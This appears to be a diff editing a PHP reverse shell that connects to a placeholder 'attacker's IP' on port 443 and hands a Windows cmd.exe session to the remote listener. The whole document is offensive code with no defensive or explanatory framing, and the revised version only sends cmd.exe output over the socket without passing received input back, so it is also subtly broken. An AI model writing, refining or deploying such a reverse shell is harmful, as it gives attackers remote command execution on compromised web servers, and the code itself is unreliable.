@@ -1,5 +1,4 @@
 <?php
-// Change the IP and port to match your setup
 $ip = '127.0.0.1';  // Attacker's IP address
 $port = 443;     // Attacker's listening port
 
@@ -12,27 +11,36 @@ if (socket_connect($sock, $ip, $port) === false) {
     die("Could not connect: " . socket_strerror(socket_last_error($sock)));
 }
 
-// Redirect input, output, and error to the socket
-socket_write($sock, "Connected!\r\n");
+// Define the command to be executed (cmd.exe for Windows)
+$cmd = "cmd.exe";
 
-$cmd = "cmd.exe";  // The command interpreter for Windows
-$shell = proc_open($cmd, [
-    0 => $sock,  // STDIN
-    1 => $sock,  // STDOUT
-    2 => $sock,  // STDERR
-], $pipes);
+// Use pipes to handle stdin, stdout, and stderr
+$descriptorspec = [
+    0 => ["pipe", "r"],  // stdin
+    1 => ["pipe", "w"],  // stdout
+    2 => ["pipe", "w"]   // stderr
+];
 
-// If the shell is open, keep the connection alive
-if (is_resource($shell)) {
-    while ($status = proc_get_status($shell)) {
-        if (!$status['running']) {
-            break;
-        }
-        usleep(100000);  // Sleep for a bit to avoid high CPU usage
+// Open the process with cmd.exe
+$process = proc_open($cmd, $descriptorspec, $pipes);
+
+if (is_resource($process)) {
+    // Handle the communication with cmd.exe
+    while (!feof($pipes[1])) {
+        // Read output from cmd.exe and send it over the socket
+        $output = fread($pipes[1], 1024);
+        socket_write($sock, $output, strlen($output));
     }
+
+    // Close the pipes
+    fclose($pipes[0]);
+    fclose($pipes[1]);
+    fclose($pipes[2]);
+
+    // Close the process
+    proc_close($process);
 }
 
-// Clean up
-proc_close($shell);
+// Close the socket
 socket_close($sock);
 ?>
